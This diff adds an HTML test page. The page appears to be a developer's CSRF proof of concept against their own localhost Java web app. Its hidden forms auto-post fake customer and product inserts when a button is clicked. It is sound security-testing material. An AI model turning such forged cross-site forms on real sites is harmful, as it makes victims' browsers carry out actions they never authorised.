@@ -1,0 +1,33 @@
+<!-- csrf-test.html -->
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>CSRF Test Page</title>
+</head>
+<body>
+<h2>CSRF Test Page</h2>
+
+<!-- Атака на добавление клиента -->
+<form id="form1" action="http://localhost:8080/TestWebApplication_war_exploded/customers" method="post">
+    <input type="hidden" name="action" value="insert">
+    <input type="hidden" name="firstName" value="CSRF">
+    <input type="hidden" name="lastName" value="Attack">
+    <input type="hidden" name="email" value="csrf@attack.com">
+    <input type="hidden" name="phone" value="1234567890">
+    <input type="hidden" name="address" value="Hacked Address">
+</form>
+
+<!-- Атака на добавление товара -->
+<form id="form2" action="http://localhost:8080/TestWebApplication_war_exploded/products" method="post">
+    <input type="hidden" name="action" value="insert">
+    <input type="hidden" name="code" value="CSRF-ATTACK">
+    <input type="hidden" name="name" value="CSRF Product">
+    <input type="hidden" name="price" value="9999">
+    <input type="hidden" name="quantity" value="100">
+</form>
+
+<button onclick="document.getElementById('form1').submit()">CSRF Attack - Клиенты</button>
+<button onclick="document.getElementById('form2').submit()">CSRF Attack - Товары</button>
+</body>
+</html>
